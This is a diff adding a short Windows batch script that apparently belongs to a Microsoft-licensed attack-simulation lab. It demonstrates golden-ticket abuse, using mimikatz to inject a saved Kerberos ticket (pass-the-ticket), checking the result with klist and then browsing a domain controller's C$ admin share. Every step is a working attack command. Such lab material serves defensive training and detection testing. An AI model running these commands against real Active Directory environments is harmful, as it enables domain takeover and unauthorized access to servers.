@@ -1,0 +1,18 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: new cmd
+klist
+pause
+:: get to location of GTs
+cd "c:\att&ck\3. Domain Dominance\GTs"
+pause
+:: PTT with GT
+c:\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "kerberos::ptt GTnuckc_20180708.kirbi" "exit"
+pause
+:: prove ticket was passed
+klist
+pause
+:: access contosodc
+dir \\contosodc\c$
+pause
